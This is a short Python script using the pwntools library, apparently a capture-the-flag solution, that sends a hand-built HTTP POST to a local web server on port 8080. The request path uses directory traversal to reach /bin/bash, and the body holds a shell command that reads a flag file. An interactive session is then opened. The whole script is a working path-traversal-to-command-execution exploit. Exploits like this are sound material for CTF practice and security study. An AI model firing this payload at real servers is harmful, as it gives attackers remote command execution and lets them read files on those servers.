from pwn import *

pl = """
cat /flag6470e394cbf6dab6a91682cc8585059b
"""

payload = f"""POST /../../../../../../../bin/bash HTTP/1.1
Host: localhost:8080
User-Agent: curl/7.68.0
Accept: */*
Content-Length: {int(len(pl))}

{pl}


"""

r = remote("localhost", 8080)

r.sendline(payload)
r.interactive()